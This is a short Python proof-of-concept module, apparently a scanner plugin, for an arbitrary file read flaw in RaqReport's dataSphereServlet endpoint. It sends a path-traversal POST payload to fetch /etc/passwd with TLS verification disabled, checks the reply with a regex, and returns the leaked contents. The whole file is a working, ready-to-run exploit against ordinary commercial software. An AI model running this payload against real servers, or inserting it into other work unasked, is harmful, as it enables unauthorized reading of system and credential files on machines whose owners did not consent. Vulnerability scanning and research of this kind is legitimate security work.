#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/o66J8GWP7sucO8MZk9WvWw',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '润乾报表dataSphereServlet接口任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/23',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
      'Accept-Encoding': 'gzip, deflate',
      'DNT': '1',
      'Sec-GPC': '1',
      'Connection': 'close',
      'sec-ch-ua-platform': "macOS",
      'sec-ch-ua': '''"Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"''',
      'sec-ch-ua-mobile': '?0',
      'Content-Length': '63',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/servlet/dataSphereServlet?action=11'
  data='path=../../../../../../../../../../../etc/passwd&content=&mode='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,data=data,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret